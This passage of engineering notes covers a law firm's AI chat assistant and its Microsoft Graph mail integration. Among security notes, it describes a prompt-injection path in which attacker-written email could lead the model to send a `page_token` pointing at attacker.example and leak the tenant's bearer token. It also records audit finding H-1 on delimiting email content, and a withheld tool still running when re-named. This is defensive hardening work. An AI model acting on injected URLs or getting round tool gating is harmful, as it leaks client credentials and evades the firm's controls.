- **Le corps ET les fichiers d'une compétence se relisent à la version ÉPINGLÉE aux pas ≥ 2** (2026-08-27, symétrie de la charte). Auparavant le corps se relisait à la TÊTE à chaque pas alors que le fichier se résolvait déjà à la paire épinglée : les deux moitiés d'une même compétence pouvaient venir de deux versions différentes dans le même tour, et l'estampille — posée au pas 1 — affirmait une version que le modèle n'avait pas vue. Le document de version ne porte NI `id` NI `current_version` : tous deux sont réinjectés depuis la paire. Une version épinglée illisible lève un **retryable**, là où `get_heads` échoue OUVERT — dégrader est honnête à la PREMIÈRE résolution (l'estampille enregistre ensuite ce qui a réellement été chargé), jamais après.
- **Fichiers de référence des compétences — trois pièges qui échouent en silence.** (1) **Le CONTENU d'un fichier n'est JAMAIS `sanitize()`d** — dérogation délibérée et documentée (`models/chat_skill.py`) : `_TAG_RE` mutilerait le matériel de référence (le piège TAG_RE des notes). C'est sûr parce que le contenu n'est rendu que sous autoescape Jinja (`<pre>{{ f.content }}</pre>` — jamais `|safe` ni `|markdown`) et retourné au modèle comme texte brut de tool_result, jamais exécuté. Seul nettoyage : les contrôles C0 sauf `\n`/`\t` — le `\r` part, donc un collage CRLF se normalise en LF et **les sha256 sont calculés sur la forme LF**. (2) **Les plafonds 6 × 40 000 sont contraints par le plafond 1 Mo de `_enforce_request_size`** sur le POST urlencodé du formulaire (français réaliste ≈ ×1,3 octet/caractère, pire cas accentué ×6 ; 6×40k + corps 30k ≈ 354 Ko réaliste, ~816 Ko pessimiste). Les relever exige de REFAIRE cette arithmétique ou de passer le formulaire en multipart (≈ ×1,05) — sinon la sauvegarde meurt en 413 sans message applicatif. (3) **Firestore refuse d'écrire DEUX FOIS le même document dans une transaction** : deux fichiers au contenu identique partagent un sha, d'où la déduplication `_content_writes` AVANT les `txn.set`. Le fake harness applique les écritures immédiatement et **ne peut pas attraper une régression** — le test épingle les CLÉS du helper, pas l'état du store. Corollaire de lecture : `get_skill_file` résout par les paires `(skill_id, version)` du TOUR (estampillées, ou en mémoire au pas 1 — `turn.get("skill_versions") or skill_pairs`), jamais par la tête : une compétence révisée pendant une pause d'autorisation lit encore la version que le prompt portait.

- **`graph.graph_get` merges EVERY nextLink page with no cap of any kind — safe for a calendar window, catastrophic for a mailbox.** No page cap, no item cap, no aggregate deadline, no response-size ceiling; the only bound is the 30 s per-page timeout. That is survivable for `calendarView` over 90 days and is not survivable for `/messages`, where one query walks thousands of rows and every row can carry a body. `utils/graph_messagerie.py` therefore **never calls it** — a source sweep in `tests/test_graph_messagerie.py` pins the absence, because the mistake is one character wide. The bounded siblings added for the mailbox (`graph_get_page`, `graph_get_bytes`, `graph_send`) are ADDITIONS: not one line of the original four changed, deliberately, because the Outlook mirror's `_PLAFOND_MUTATIONS = 80` is calibrated against their exact behaviour under gunicorn `--timeout 60`. The one thing that did change is additive on the exception: `GraphError` now carries `status` and `retry_after_s` (keyword-only, defaulting to `None`), so the mail layer branches on an int instead of regexing a French sentence for an HTTP code; `str(exc)` is byte-identical and every existing `except GraphError` is untouched.
- **An attachment listing WITHOUT a `$select` downloads every attachment.** Graph returns `contentBytes` inline in the collection response, so `GET /messages/{id}/attachments` on a message carrying 24 MiB of files transfers and holds ~64 MiB of base64 — on a 512 MB F2, unbounded, for a call that only wanted names and sizes. `graph_messagerie.list_attachments` always sends `$select=id,name,contentType,size,isInline`, pinned by test, and `graph_get_page`'s 8 MiB `max_bytes` is the backstop for the day someone drops it. Bytes come one at a time from `/$value`, streamed under a ceiling.
- **`reception@` is an ALIAS of the lawyer's own mailbox, and the portal saves every invitation to Sent Items.** `utils/courriel.py` sends with `"saveToSentItems": True`, `services/portail_emission` puts a **live single-use Firebase sign-in link** in that body, and `tests/test_graph_courriel.py` states the alias relationship in its own docstring. `GET /users/{upn}/messages` spans Sent Items, so an unfiltered mail read would pull working credentials into `chat_conversations/{id}/turns` — append-only, no delete path, offloaded verbatim to Storage past 100 KB. `mail_executor._search` drops every row whose `from` casefolds to `Config.GRAPH_SENDER_UPN` and reports the count as `app_sent_excluded`; a fixture whose body contains a sign-in URL pins it. **Do not disarm that exclusion**, and confirm the alias relationship before arming anything.
- **A dossier's email search is a UNION, never an intersect — and that is the whole feature.** Deriving the search basis only from the addresses recorded on the dossier returns ZERO rows the moment a counterparty writes from an address the file does not carry, which is the *common* case (an adjuster, a new paralegal, a personal address), and zero rows read to the lawyer as « ce dossier n'a aucune correspondance » while a 40-message exchange sits in the Inbox. `mail_search(dossier_id=…)` therefore issues TWO searches — the recorded `participants:` AND the file's identity tokens (party surnames from `clients[].name`, `file_number`, `court_file_number`) — merges them on message id, and stamps every row with `match_basis ∈ participants | identite` so the basis is visible rather than assumed. `extra_participants` lets an address supplied in conversation be used in the same breath. Corollary: `page_token` is REFUSED in dossier mode, because one continuation URL cannot mean anything for two merged searches.
- **`get_dossier` swallows every failure into `None`, so a caller that reports to the lawyer must use `get_dossier_strict`.** The two states — « this dossier does not exist » and « the read failed » — are the same value out of `get_dossier`, so a Firestore hiccup during a mail search would tell the lawyer his live case file is not in Athéna, and run no search at all. `models/dossier.get_dossier_strict` is the raising twin (the `count_dossiers_for_partie_strict` naming convention); a display caller keeps the fail-open one, a caller whose next sentence is an assertion about the practice's records does not.
- **Folder labelling may fail open; folder EXCLUSION may not.** `GET /users/{upn}/messages` includes Deleted Items and Clutter by default. A missing folder *name* is a missing display string and is harmless, but reporting `deleted_items_excluded: 0` when the `deleteditems` lookup FAILED tells the model « nothing was in the trash » and quotes a deliberately discarded message back as live correspondence. `deleted_items_id()` returns `(id, ok)` and the search envelope emits `deleted_items_excluded: null` plus a French warning whenever `ok` is false — never a count it cannot stand behind.
- **A thread cursor must be a POSITION, never a Graph `@odata.nextLink`.** A 60-message conversation arrives in ONE Graph page, so the moment the character cap truncates the read there is no nextLink to hand back and the continuation is unrepresentable — the model drafts a reply on the first third of an exchange with no way to ask for the rest and no signal that it is missing the concession made in message 48. `mail_tools.slice_thread` cursors on `(conversation_id, received, message_id)` over a globally sorted list, and always takes at least one message so a single oversized message advances the window instead of paging forever on the same position.
- **The provenance envelope wraps a tool result for the MODEL, so a consumer that PARSES a result must read `raw_content`.** Audit finding H-1 (confirmed 2026-08-26, fixed 2026-08-28) put externally-authored content — document text, and now email — inside a delimited block with a per-call nonce, because it used to arrive in byte-for-byte the shape the lawyer's own instructions arrive in. The near-miss: `turn_engine._native_pdf_fallback` decides whether a scanned exhibit needs the native-PDF block by `json.loads`-ing the tool result, and on the wrapped form that fails into a silent `[]` — the exhibit simply stops being readable, with nothing anywhere reporting it. `ToolExecution.raw_content` carries the pre-envelope payload for exactly that consumer. The nonce is not decoration: a fixed delimiter is one an attacker types into their own email to close the block early and continue outside it.
- **Every mail switch gates EXECUTION, not the tools array.** Absence from `anthropic_tools()` is not a control: `_assemble_messages` replays prior `tool_use` blocks verbatim, so the model re-names a withheld tool and it still runs — verified on live code, where `update_dossier` is in `CHAT_EXCLUDED_TOOLS`, absent from the array, and `executor_for("update_dossier")` still returns `in_process`. `registry.executor_for` returns `None` for a mail name when `CHAT_MAIL_ENABLED`/`chat_mail_configured()` are not both true, and a test asserts the tool is REFUSED at `execute_tool` rather than merely missing. Related: `CHAT_WRITE_TOOLS` is `frozenset(mcp_tools.WRITE_TOOLS)` and is pinned BY EQUALITY, so no chat-local name can ever join it — `CHAT_LOCAL_WRITE_TOOLS` is the sibling set that puts the mail draft AND the mail filing under `CHAT_WRITE_ENABLED`. Gating only the draft would leave the switch reporting « writes disabled » while a scheduled run filed fourteen messages as permanent documents the chat cannot undo.
- **A filed email's provenance goes in DEDICATED fields, never in `description`.** The portal lot reversed itself on 2026-08-27 for this exact reason: `description` is the ONE free-text field the document edit form offers the lawyer, so squatting it makes him choose between describing a document and keeping its traceability. `mail_file_to_dossier` writes `courriel_message_id` / `courriel_expediteur` / `courriel_objet` / `courriel_recu_le` plus the tag `courriel`; the duplicate check keys on `courriel_message_id`, and filing the same message twice is REPORTED, not refused — the lawyer may legitimately want a copy in a second dossier, and no tool here can delete a wrong guess.
- **Graph throttles per app ID + mailbox, and four consumers share one of each.** 10 000 requests / 10 min, 150 MB / 5 min, max 4 concurrent — fixed and non-adjustable. The portal's outbound email, the Bookings sync, the Outlook mirror and now the mailbox reader all use the « Pallas-Athena-Graph » registration against `jason@poirierlavoie.ca`. The mail layer is the only one with a retry, and the mirror **abandons its entire 10-minute sweep on any `GraphError`, 429 included** — so a heavy mail session can silently cost one mirror cycle, with `reason="graph_error"` as the only trace. Distinguishing 429 in `taches_outlook`/`taches_bookings` (now possible via `GraphError.status`) is a known, unclaimed improvement.
- **The mail draft key includes `tool_use_id`, deliberately.** Two drafts asked for in ONE batch must derive different keys; a key over `(conversation, turn, step, tool, recipients)` alone would make the second call find the first's marker and PATCH over it — one draft where the lawyer asked for two, both reported as successes. The key is stable across the retry that actually happens: when a segment is committed carrying `tool_use` blocks but no `tool_results`, `_advance` replays the STORED blocks, so the id is the same. The residual case — a crash before ANY commit — re-calls Vertex, mints fresh ids and can leave one extra inert draft; that is disclosed rather than pretended away, the posture the registre already takes with `vertex_calls_started`/`vertex_calls_recorded`. The duplicate check itself fails OPEN: a duplicate draft is clutter the lawyer deletes in a gesture, while failing closed is silent non-delivery of work he asked for.
- **`security.sanitize` deletes an RFC-5322 Message-ID entirely — it is a `<…>` run.** `_TAG_RE = <[^<>]*>` does not know what a tag is; it deletes every angle-bracket run, and `<AM0PR07MB1234.eurprd07.prod.outlook.com>` is one. `models/document._sanitize_data` sanitizes **every** string in the metadata dict, so a Message-ID handed to `upload_document` reaches Firestore as `""`. The mail lot walked into this on the one path whose whole justification is traceability: the provenance field would have been blank on every filed email in the practice, and the duplicate guard — the only check standing in front of an act with **no delete tool** — would have compared `""` against `"<…>"` for ever. `mail_executor._message_key` strips the brackets on the write **and** on the comparison, so the stored value no longer depends on what `sanitize` happens to remove. **The lesson is about the test, not the regex**: the three tests covering that path all mocked `upload_document`, i.e. the exact boundary the defect lived at, so 3 164 green tests proved nothing. A test that asserts on a dict handed to a mock is not a test of what gets stored — where `sanitize` is in the path, drive the real model helper. This is the same family as the `append_to_note` chevron trap already documented above.
- **An absolute URL reaching `graph_get_page`/`graph_get_bytes` carries the firm's Graph bearer token to whatever host it names.** `_merged_headers` attaches `Authorization` to every request, and `graph_get_page` accepts an absolute URL by design (that is how a `@odata.nextLink` continuation works). `mail_search` takes its `page_token` **from the model** — which is reading email written by anyone who knows the address — so `page_token: "https://attacker.example/x"` exfiltrated the tenant credential in one call, and `_call`'s retry would re-send it up to three times honouring the attacker's own `Retry-After`. Both bounded verbs now refuse an absolute URL that is not under `https://graph.microsoft.com/` (`graph._resolve_url`), and `mail_executor._search` refuses the same value earlier so the message names the field. Note the prefix check must be on the **full** scheme+host prefix: `graph.microsoft.com.attacker.example` starts with `graph.microsoft.com` as a substring, and a `startswith("https://graph.microsoft.com/")` with the trailing slash is what excludes it. **The original four verbs are deliberately not guarded** — they only ever see an absolute URL produced by their own nextLink loop, never a caller argument, and the rule for this module is that they do not change.
- **A tool result that reports `truncated: false` must have SEEN the end.** `mail_search` in dossier mode merges two Graph searches, and a merged result cannot hand back one continuation token — but discarding both branches' `@odata.nextLink` and computing `truncated` from the merged row count alone reported completeness on a search that had seen page 1 of 200 messages, with the model then telling the lawyer that was the file's whole correspondence. The flag is now `len(ordered) > len(out) or bool(next_token) or saw_more`, where `saw_more` is true if EITHER branch had more. Paging is refused rather than faked (`next_page_token: null` plus a note saying to narrow with dates), because a token that means nothing is worse than no token.
- **`CHAT_MAIL_MAX_CALLS_PER_BATCH` bounds COUNT; `CHAT_MAIL_TURN_BUDGET_S` bounds TIME, and neither substitutes for the other.** `_run_tools` iterates its `tool_use` blocks with **no length check**, and the tool phase runs in the SAME gunicorn request as the Vertex call that preceded it (`chat.yaml`, `--timeout 570`). The time budget does not catch a batch of fast-failing calls, and the count cap does not catch three slow filings — the counter is a LIST in `mail_context` precisely so it survives `execute_tool`'s per-call `{**ctx}` copy, which copies references. A config constant that nothing reads is worse than no constant: its comment claims a protection that does not exist.
- **`reception@poirierlavoie.ca` is an ALIAS of `jason@poirierlavoie.ca`, not a second mailbox** (confirmed by the practitioner 2026-08-28). One mailbox object, two SMTP addresses, and three consequences that pull in different directions. **(a) The Exchange scoping gets SIMPLER**: there is exactly one mailbox to scope, so one RBAC-for-Applications resource scope covers `Mail.Send`, `Mail.ReadWrite` and `Calendars.ReadWrite` together — the earlier worry that one policy could not grant `Mail.ReadWrite` on one address while withholding it from the other is MOOT, because there is no other. The negative test must therefore be written against a **third, unrelated** mailbox: a read of `reception@` will SUCCEED, and reading that as a scoping failure would send someone chasing a control that is working. **(b) `Mail.ReadWrite` now covers the portal's own outbound mail**, unavoidably — the same grant that lets the assistant read correspondence lets it modify what the application sent. Nothing in the code does, and the « no send/delete verb » sweep pins that, but the PERMISSION is broader than the code and that is now the honest statement. **(c) The application's own machine mail is in the corpus the assistant reads.** `utils/courriel.py` sends every portal invitation with `saveToSentItems: true` and `services/portail_emission` puts a **live single-use Firebase sign-in link** in the body, so Sent Items holds working credentials inside the mailbox the mail tools search — bound for `chat_conversations/{id}/turns`, which is append-only with no delete path. **A sender-based exclusion cannot be trusted to catch them**: Exchange Online rewrites an alias's P2 `From` to the mailbox's PRIMARY address unless `SendFromAliasEnabled` is on (an org setting), so an invitation may come back stamped from the juriste himself; and excluding HIS address is refused, because it would drop half of every thread — the outbound side of a conversation is the correspondence, not noise. The control is therefore at the CONTENT level: `mail_tools.scrub_payload` redacts any URL carrying an `oobCode` from **every string a mail read returns**, applied at ONE seam in `mail_executor.run` (a control applied per call site is one that is eventually forgotten at a new call site — and the site that forgets it here would be the forwarded-attachment path, where a client sends the invitation back). It is a single linear scan with no regex (the `_looks_like_eml` doctrine, CWE-1333), and it is RETROACTIVE, which a sender rule can never be for the invitations already sitting in Sent Items. The sender test survives as `app_sent_excluded_best_effort` — free, helpful when the rewrite does not happen, and named so nobody mistakes it for the guarantee.
- **Une permission accordée dans Entra ET portée dans Exchange RBAC ne porte RIEN : les deux autorités s'ADDITIONNENT.** La documentation Microsoft est explicite (« RBAC for Applications », FAQ) : si le service principal détient `Mail.Read` à l'échelle de l'organisation dans Entra **et** un `Mail.Read` porté dans Exchange RBAC, le résultat est « **no effective resource scoping** » — l'application l'obtient sur TOUTES les boîtes du locataire et la portée est décorative. Le lot messagerie a d'abord été planifié à l'envers (« accorder `Mail.ReadWrite` dans Entra, puis le porter dans Exchange »), ce qui aurait donné une portée qui ne portait rien, avec un runbook qui affirmait le contraire. **`Mail.ReadWrite` s'accorde donc UNIQUEMENT dans Exchange RBAC, jamais dans Entra**, et le script d'exploitation refuse d'aller plus loin s'il voit la permission côté Entra. ⚠ Corollaire sur l'existant : `Mail.Send` et `Calendars.ReadWrite` sont aujourd'hui des grants Entra à l'échelle de l'organisation — ils FONCTIONNENT, mais ils ne sont portés par rien, et les porter exigerait de les RETIRER d'Entra d'abord, ce qui touche trois sous-systèmes vivants (courriel du portail, synchro Bookings, miroir Outlook) et se fait donc dans son propre lot, jamais en passant. Deux autres pièges du même document : l'ObjectId attendu par `New-ServicePrincipal` est celui des **Applications d'entreprise**, pas celui des Inscriptions d'applications (la page des inscriptions en affiche un autre) ; et un changement de permission met **de 30 minutes à 2 heures** à sortir du cache — `Test-ServicePrincipalAuthorization -Identity <app> -Resource <boîte>` le contourne et rend `InScope: True/False`, ce qui en fait la seule vérification utilisable tout de suite.
- **Ne jamais reporter un décalage calculé sur une chaîne `casefold()`ée dans la chaîne d'origine — et un test de linéarité qui ne mesure rien ment.** Le retrait du lien de connexion (`mail_tools.redact_credentials`) cherchait le marqueur dans une COPIE repliée puis indexait l'ORIGINAL. `casefold()` n'est pas conservateur en longueur : « ﬁ » (U+FB01) devient « fi », « ß » devient « ss » — et U+FB01 est précisément ce que pdftotext et Adobe émettent pour « fi », donc tout extrait de PDF collé dans un courriel en porte des dizaines. Avec 30 ligatures devant le lien, le `oobCode` VIVANT **et** la clé `apiKey` ressortaient intacts pendant que le marqueur « [LIEN DE CONNEXION RETIRÉ] » s'imprimait sur un mot de la signature : le contrôle échouait **en se présentant comme ayant réussi**, ce qui est pire que son absence ; au-delà de ~130 il levait un `IndexError` avalé par le `except Exception` de `run()`. La comparaison porte désormais sur une TRANCHE de l'original (`body[i:i+n].casefold() == marqueur`), forme dans laquelle un indice ne peut pas glisser — la classe de bogue disparaît au lieu d'être rapiécée. Deuxième moitié, découverte au même endroit : le balayage était **quadratique** (chaque occurrence re-parcourait toute la séquence — 18 000 caractères en 1,6 s, ×4 par doublement) sur une entrée fournie par l'expéditeur, et `_thread` lui passait un corps **non écrêté**, `slice_thread` prenant toujours la première ligne entière. ⚠ Le test censé garantir la linéarité n'assertait que « `re.` n'apparaît pas dans la source » : il est resté VERT pendant toute la durée du défaut. Un test qui rassure à tort vaut moins que pas de test — il mesure maintenant (plafond absolu à 1 s sur 36 000 caractères, où le linéaire met ~1 ms et le quadratique ~10 s), et le marqueur a perdu son « = » final pour survivre à une passerelle de réécriture de liens qui encode `oobCode%3D`.
- **Une propriété d'outil nommée comme un MOT-CLÉ corrompt les arguments de TOUT le tableau, chez Gemini.** Une seule propriété nommée `from`, dans une seule déclaration (`legislation_qclaw_get_articles`, `chat/worker_tools.py`), a fait rendre au modèle `date_from1`, `received_from1` — et `from1_` sur l'outil fautif lui-même — sur QUATRE outils sans rapport, pendant que `date_to` et `received_to` restaient corrects dans le MÊME appel. Établi en A/B, à deux déclarations comme à soixante-neuf, sur Pro comme sur Flash, de façon déterministe : renommer nettoie, remettre re-corrompt. Le déclencheur est la QUALITÉ DE MOT-CLÉ, pas le mot — un voisin portant `class` corrompt un `date_class` ; les mots-clés DOUX (`type`) ne déclenchent rien. **Aucun message d'erreur ne répare cela** : replacé devant un refus qui NOMME `date_from`, le modèle répond « je dois utiliser `date_from` » puis ré-émet `date_from1` — la corruption est en aval de son intention. Le renommage vit donc à la frontière Gemini (`chat/gemini.py` `_renommer_proprietes`, suffixe `_arg`, `required` suivi) avec chemin retour à la lecture des arguments, si bien que le connecteur externe, le chemin Anthropic et le Worker gardent le nom d'origine ; seule la DÉCLARATION compte, le même nom dans l'historique est inoffensif. Les fiches des Workers étant ENGENDRÉES depuis leur `tools/list`, un nom nouveau repassera par là sans relecture humaine : le garde est `keyword.iskeyword`, jamais une liste tenue à la main (`tests/test_chat_gemini.py`).
- **`list_tasks(include_completed=True)` ne rend PAS vos tâches ouvertes — il rend les 50 plus anciennes TERMINÉES.** Le drapeau retire le filtre de statut, et le modèle trie dated-first par échéance CROISSANTE sur toute l'histoire du cabinet : mesuré en production, 123 tâches dont 109 terminées, les 50 premières terminées à 50/50 et les 14 ouvertes toutes hors page, avec `truncated: true` en permanence (`123 > 50`). Une lecture de déduplication bâtie dessus ne contient ni une tâche ouverte ni un titre à comparer — et elle a l'air d'avoir réussi. Sans le drapeau, le filtre serveur garde `à_faire`/`en_cours` et la réponse tient dans une page. Pour savoir si un titre existe déjà, terminé compris, la seule forme exacte est **par dossier** (`dossier_id` + `include_completed`), dont la portée étroite garantit l'absence de troncature (12 tâches au maximum sur un dossier, mesuré).
- **Le corps d'une compétence et les NOMS de ses fichiers de référence doivent s'accorder exactement.** `models/chat_reference_files.read_from_manifest` apparie sur le nom ENTIER (à la casse près) : un corps qui cite `courriels.md` ne trouve pas un fichier enregistré `Courriels`, et les quatre fichiers d'une compétence sont devenus illisibles d'un coup — le modèle recevant « Fichier inconnu », sans que rien d'autre ne le signale. Le listing du bloc système montre les noms STOCKÉS pendant que le corps cite les siens : deux vérités contradictoires sous les yeux du modèle. La convention de la maison est le nom à plat avec `.md` (`docs/competences/*/`). Le `description` de chaque fichier n'est pas décoratif non plus — il entre dans le bloc système et sert au modèle à choisir lequel ouvrir ; le `description` de la COMPÉTENCE, lui, n'y entre jamais (`charter.system_blocks` n'assemble que le nom, le corps et le listing) et ne s'écrit donc que pour le juriste.
- **`promptTokenCount` de Gemini inclut DÉJÀ les jetons lus en cache ; `input_tokens` d'Anthropic ne les inclut PAS.** La doc Google est explicite (« when cachedContent is set, this is still the total effective prompt size »). `vertex.segment_cost_usd_micros` additionnant `input_tokens` et `cache_read_input_tokens`, rendre le total côté Gemini facturait la tranche cachée DEUX FOIS — au plein tarif d'entrée puis au tarif de lecture. `gemini._usage` rend donc la part NON cachée, ce qui est le contrat que la fonction de prix suppose pour les deux fournisseurs, et l'invariant `input_tokens + cache_read_input_tokens == promptTokenCount` est épinglé. Un test qui n'assertait que `output_tokens` et `cache_read` ne pouvait pas le voir.
- **Un refus doit NOMMER ce qui est valide, pas seulement ce qui ne l'est pas.** `validate_args` répondait « `date_from1` is not a supported argument » et s'arrêtait là : le modèle a renvoyé le même nom huit fois de suite, sur quatre outils, brûlant huit des dix appels d'une exécution planifiée. La convention existait déjà à deux pas — `read_from_manifest` répond « Fichier inconnu. Fichiers disponibles : … » — elle n'avait simplement jamais atteint le validateur. Deux réserves apprises en la posant : la suggestion de voisin ne parle que si les candidats forment une CHAÎNE et que l'extension commence à une frontière de mot, sans quoi `dossier` propose `dossier_status` (un vrai filtre, qui RÉTRÉCIT la portée en silence) là où l'appelant voulait `dossier_id`, et `id` propose `idempotency_key`, que la garde de sécurité épinglée refuse précisément. Et un refus d'arguments doit se JOURNALISER sous son propre motif (`chat_tool_refused` / `validation_failed`) : émis nulle part malgré sa présence dans OBSERVABILITY, il arrivait en `chat_tool_call`/failure indistinguable d'une panne Firestore, et huit refus consécutifs n'ont rien levé.
- **Les outils APPROUVÉS tournent AVANT l'appel de modèle, et tout `retryable` de cet appel rejouait le lot entier.** `claim_step` ne consomme PAS le jeton d'étape — à dessein : un appel mort à mi-course doit pouvoir être refait — mais le bloc en attente est au-DESSUS de l'appel, si bien qu'une redélivrance ré-exécutait chaque écriture approuvée. Mesuré sur le vrai moteur : deux exécutions à la première reprise, **DIX au bout des cinq** de `CHAT_TASK_RETRY_TERMINAL`, et le registre n'en gardait aucune trace puisque rien n'était commis. La surface est plus large qu'elle n'en a l'air : **onze** outils sont sous autorisation (`GATED_TOOLS`), pas quatre — l'exclusion du TABLEAU d'outils n'empêche pas l'exécution (`executor_for("import_invoice")` rend toujours `in_process`, le piège déjà consigné pour la messagerie) —, un appel sous garde retient le lot ENTIER, et seize écritures peuvent y voyager. Le correctif commet les résultats **sur le seul chemin d'échec** (`except ChatVertexRetryable` → commit → `raise`), après quoi la redélivrance tombe dans la branche de RÉPARATION déjà existante et saute le bloc. ⚠ Ne JAMAIS commettre avant l'appel : un commit rote le jeton, et le gestionnaire d'erreur FATALE de `process_task` tient encore l'ancien — son commit perdrait la course en silence, le tour resterait « running » pour toujours (pas de redélivrance, pas de bouton « Relancer » — le gabarit ne l'offre qu'en `pending` —, pas de passe de réparation, qui ne couvre que le planifié, pas de courriel) pendant que le journal annoncerait un échec propre. Cette variante a été écrite, reproduite, et écartée. Deux résidus assumés, à ne pas maquiller en « exactement une fois » : deux redélivrances CONCURRENTES peuvent encore exécuter le lot toutes les deux (le `decision="lot_execute"` de `chat_authorization` est le filet qui le montrerait ; la file tient la fenêtre près de zéro avec `max-concurrent-dispatches=2` — ne pas la relever), et un échec de `_store_blocks` entre l'exécution et le commit laisse les écritures faites sans que le registre le dise.
---
...
> **Timing (audit 2026-08-26).** The suite itself is negligible against the build budget: 2816 tests collect with zero errors and run in **~10 s** locally (slowest single test 1.7 s — `test_soumise_sans_enveloppe_200`). The budget is consumed by the pip install and the deploy steps — the LIVE `cloudbuild.yaml` (Phase N) carries FIVE `gcloud app deploy` steps (default, portail, chat, dispatch, cron) under `timeout: '1800s'` (the yaml transcribed above is the pre-Phase-N 3-step shape). Three service deploys at typical App Engine pace can consume 10-18 min of that 30: **watch a real build's wall time in Cloud Build history after each new service is added**; the margin is real but no longer lavish.
...
- **Ops prerequisites (ordered — BEFORE pushing the CI-wiring commit):**
  ...
  7. Entra ID : app « Pallas-Athena-Graph », permission d'application `Mail.Send` + consentement admin ; secret → `graph-client-secret` ; `GRAPH_TENANT_ID`/`GRAPH_CLIENT_ID`/`GRAPH_SENDER_UPN` dans `app.yaml` (⚠ portée : **RBAC for Applications** — `ApplicationAccessPolicy` est HÉRITÉ, sa dépréciation est annoncée, et surtout il est PAR APPLICATION, donc incapable d'accorder `Mail.ReadWrite` sur une boîte en le refusant sur une autre)
...
- **Ops prerequisites (ordered):**
  1. **Entra ID** : ajouter la permission d'application **`Calendars.ReadWrite`** à « Pallas-Athena-Graph » (créée en L1) + **consentement admin** (portée : **RBAC for Applications**, voir la note en L1 — l'ancien `ApplicationAccessPolicy` est par application, pas par permission).
...
- **Exploitation, ordonné :** (1) `MCP_WRITE_ENABLED: "false"` déployé D'ABORD — le scope est gelé à l'émission, donc le jeton en vigueur verrait les quatre outils dès leur déploiement, sous un écran de consentement qui disait une ligne facturée figée à jamais (la mitigation du lot Q, pour la même raison) ; (2) déployer ; (3) `python -m scripts.revoke_mcp_tokens`, retirer et re-ajouter le connecteur en cochant « Autoriser les écritures » ; (4) remettre `"true"`, vérifier `tools/list` → 47 ; (5) reprendre dossier par dossier : `list_time_entries` → proposer les codes → `_bulk` en `dry_run` → relire → commettre avec une `idempotency_key`, puis vérifier l'onglet Budget. **Depuis le retrait du `dry_run` (2026-08-27), l'étape d'aperçu n'existe plus** : on relit avec `list_time_entries`, on décide, et on commet directement avec une `idempotency_key` — le rapport ligne par ligne du `_bulk` (`applied`/`unchanged`/`refused`) est ce qui remplace la simulation.

### Phase N — Client de clavardage IA (Claude sur Vertex) (2026-08-26, ✅ code complete — **infrastructure pending**)

- **Contexte.** `SPEC_PHASE_N_CHAT.md` (conçu côté Claude.ai) voulait que le matériel privilégié cesse de transiter par un produit IA grand public : inférence Vertex sous le projet du cabinet, registre append-only, outillage attribué. La revue d'implémentation (3 agents d'exploration + vérifications web) a confirmé l'architecture et trouvé quatre défauts réels, corrigés : la §2 contredisait le gunicorn `--timeout 60` des services existants ; la « Phase K extraction pipeline » de §4.4 n'a jamais existé (Phase K = fidéicommis, et `models/document.py` n'avait même plus de lecteur d'octets) ; TOOLS n'a AUCUN opt-out d'exposition (un outil ajouté paraît sur claude.ai immédiatement) ; et le spec taisait `pause_turn`, la réhydratation byte-exacte des `encrypted_content`, le fan-out d'actifs et les inventaires d'un 3e service. **Dix décisions de Jason (D1–D10)** consignées en tête du spec ; les FLAG non contredits tiennent.
- **Livré.** Le **3e service App Engine `chat`** (F2, SA par défaut, gunicorn 570 s, worker-only — `chat/app.py` sans CSRFProtect) exécutant la **chaîne de tours** : `models/chat_conversation.py` (registre + claim/commit transactionnels par `step_token`, branche REPAIR du crash-entre-commit-et-enfilage, comptabilité par compteurs dans le commit terminal, compteurs d'honnêteté `vertex_calls_started/recorded`), `chat/turn_engine.py` (assemblage, offload >100 Ko vers `users/{uid}/chat/…` + réhydratation sha256, `pause_turn`, plafond 12, repli PDF natif D2, terminalisation bruyante), `chat/vertex.py` (rawPredict — endpoint GLOBAL, le seul servant ces modèles ; taxonomie retryable/fatal, prix en usd_micros depuis `CHAT_PRICING`). **Outils** : registre chat référençant TOOLS PAR IDENTITÉ (parité d'écriture D9 dérivée), exécution in-process refaisant `validate_args`, Workers REST à liaison tardive (D5, 2 jetons D10), `web_search` basique. **Le lot MCP atomique 47 → 52** : `get_document_text` (nouveau seam `get_document_bytes` 40 Mo + `utils/pdf_text.py`/pypdf — la SEULE dépendance nouvelle), `get_draft`/`list_drafts` (D8), `save_draft`/`revise_draft` (`models/chat_draft.py` versionné, provenance par ContextVar ; `revise_draft` ∈ EDIT_TOOLS), consentement réécrit (« le contenu… transite alors par claude.ai »), INSTRUCTIONS 29+23. **§12** : `models/chat_scheduled_task.py` (dispatch = CAS d'occurrence + conversation + 2 tours en UNE transaction) + `chat/planification.py` (jours juridiques, rattrapage même-jour, passe de réparation, `livrer_rapport` au-plus-une-fois via `poser_marqueur_courriel`) + 4e entrée cron. **UI** : `/chat` (nav « Assistant » ×2, icône `forum` → subset v368 + recompilation `app.21501045.css` + fan-out complet), transcript (`<details>` natif pour Réflexion/outils, markdown existant, coût USD), le PREMIER polling du dépôt (2 s → 286), écrans compétences/tâches planifiées/brouillons (« Verser en Word » via H.3). **Observabilité** : famille `pallas.chat` (19 événements) + spans `chat.*`. `_CHILD_COLLECTIONS` += `chat_conversations`/`chat_drafts`. **Zéro index composite nouveau, zéro TTL nouveau.** 2 627 → 2 812 tests (+185).
- **Ops prerequisites (ordered — see DEPLOYMENT.md §11b for the commands):** (1) **audit logging Firestore Data Access** (le contrôle compensatoire du registre — jamais provisionné à ce jour, le spec le croyait déjà actif) ; (2) Model Garden : Sonnet 5 + Opus 5 avec **vérification de la classe de rétention d'Opus 5** (repli documenté Opus 4.8 dans `CHAT_MODELS`) + quotas ; (3) `roles/aiplatform.user` au SA par défaut ; (4) l'endpoint est **GLOBAL** — vérifié en direct le 2026-08-26 : `us` répond 501, `us-east5` 404 ; les alias nus de modèles sont valides (429 de quota, pas 404) et le quota par défaut des base models est ZÉRO → demande d'augmentation (DEPLOYMENT.md §11b 4b) ; (5) file `chat-turns` (`--max-attempts=8 --min-backoff=10s --max-backoff=300s --max-concurrent-dispatches=2 --max-dispatches-per-second=1`) + vérifier le pare-feu `0.1.0.2/32` ; (6) **révoquer les jetons MCP AVANT le déploiement** — `get_document_text` est une LECTURE qu'aucun kill switch ne cache — puis déployer (build : default → portail → **chat** → dispatch → cron → prune ×3) et re-consentir sous le nouvel écran (52 outils, case écritures) ; (7) secrets Workers ×2 (`printf`, jamais `echo`) quand Jason fournit les endpoints (stub inerte d'ici là) ; (8) première mise en service : conversation sèche (poller s'arrête à 286), conversation à outils, échec provoqué 